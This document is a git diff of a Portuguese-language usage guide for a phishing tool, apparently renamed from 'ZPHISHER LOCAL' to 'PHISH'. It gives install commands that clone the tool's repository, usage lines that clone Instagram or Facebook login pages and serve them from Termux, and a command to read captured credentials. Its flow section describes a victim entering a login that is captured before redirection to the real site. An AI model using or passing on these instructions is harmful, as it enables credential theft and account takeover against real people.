@@ -1,4 +1,4 @@
-# ZPHISHER LOCAL - Guia de Uso
+# PHISH - Guia de Uso
 
 ## O que faz:
 1. Clona a página de login de qualquer site
@@ -10,23 +10,27 @@
 - Termux (sem root)
 - Node.js (o script instala automaticamente)
 
-## Como usar:
-
-### Método 1 - Interativo:
+## Instalação:
 ```bash
-cd ~/zphisher-local
-bash start.sh
+git clone https://github.com/tafasad/phishing-local.git
+cd phishing-local && chmod +x phish && ./phish
 ```
 
-### Método 2 - Direto:
+## Aliás (opcional, pra chamar só `phish`):
 ```bash
-cd ~/zphisher-local
-bash start.sh https://instagram.com https://instagram.com
+echo 'export PATH="$PATH:$HOME/phishing-local"' >> ~/.bashrc && source ~/.bashrc
 ```
 
-### Método 3 - Com porta customizada:
+Depois é só digitar: `phish`
+
+## Método direto:
 ```bash
-bash start.sh https://facebook.com https://facebook.com 9090
+./phish https://instagram.com https://instagram.com
+```
+
+## Com porta customizada:
+```bash
+./phish https://facebook.com https://facebook.com 9090
 ```
 
 ## Fazer a pessoa acessar pelo nome (opcional):
@@ -50,16 +54,16 @@ Agora a pessoa digita no navegador: `http://instagram.local:8080`
 
 ## Ver capturas:
 ```bash
-cat ~/zphisher-local/capturas.txt
+cat ~/phishing-local/captured.txt
 ```
 
 ## Fluxo:
-```
-1. Você roda: bash start.sh https://instagram.com https://instagram.com
-2. Script baixa o HTML/CSS do Instagram
+```bash
+1. Você roda: phish (ou ./phish)
+2. Script baixa o HTML/CSS do site
 3. Servidor local inicia na porta 8080
 4. Você pega o IP do Termux: http://SEU_IP:8080
 5. A pessoa acessa e digita login
 6. Você captura os dados
-7. Ela é redirecionada pro Instagram real
+7. Ela é redirecionada pro site original
 ```
